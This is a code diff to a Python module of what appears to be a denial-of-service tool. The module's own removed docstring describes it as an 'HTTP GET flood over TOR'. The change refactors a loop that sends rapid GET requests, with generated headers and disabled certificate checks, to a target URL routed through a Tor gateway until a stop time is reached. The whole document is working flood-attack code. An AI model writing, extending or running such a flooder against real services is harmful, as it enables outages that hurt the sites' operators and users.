@@ -22,10 +22,6 @@ SOFTWARE.
 
 '''
 
-'''
-HTTP GET flood over TOR module
-'''
-
 import time, requests
 from src.core import Core
 from src.utils import *
@@ -35,10 +31,11 @@ def flood(attack_id, url, stoptime) -> None:
 
     while time.time() < stoptime and Core.attackrunning:
         try:
-
+            target_url = url.replace('onion', utils().tor_gateway())
+            
             Core.session.get(
-                utils().buildblock(url.replace('onion', utils().tor_gateway())), 
-                headers=utils().buildheaders(url.replace('onion', utils().tor_gateway())),
+                utils().buildblock(target_url), 
+                headers=utils().buildheaders(target_url),
                 verify=False, 
                 timeout=(5,0.1), 
                 allow_redirects=False,
